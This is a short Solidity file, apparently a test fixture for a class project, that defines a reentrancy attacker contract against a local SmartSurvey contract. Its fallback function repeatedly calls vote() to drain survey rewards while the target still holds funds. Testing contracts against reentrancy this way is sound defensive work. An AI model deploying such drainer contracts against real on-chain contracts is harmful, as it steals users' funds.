// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {SmartSurvey} from "../src/SurveyContract.sol"; 

contract reentrancyAttacker2 {
    SmartSurvey public smartSurvey;
    string public surveyName;

    constructor(SmartSurvey _smartSurvey, string memory _surveyName) {
        smartSurvey = _smartSurvey;
        surveyName = _surveyName;
    }

    function attack() external payable {
        //register the attacker
        smartSurvey.registerUser("attacker", 1111);
        
        //make a survey 
        string[] memory options = new string[](2); 
        options[0] = "no";
        options[1] = "yes";
        smartSurvey.create_survey{value: 100 ether}("BlockChainClass", "Should I take our course in blockchain?", options, 1000, 2, 1111);
        smartSurvey.vote("BlockChainClass", 0);

        //end it
        smartSurvey.vote(surveyName, 1);
    }

    //fallback function tries to keep collecting reward from the bank
    fallback() external payable {
        if (address(smartSurvey).balance >= 1 ether) {
            smartSurvey.vote(surveyName, 1);
        }
    }
}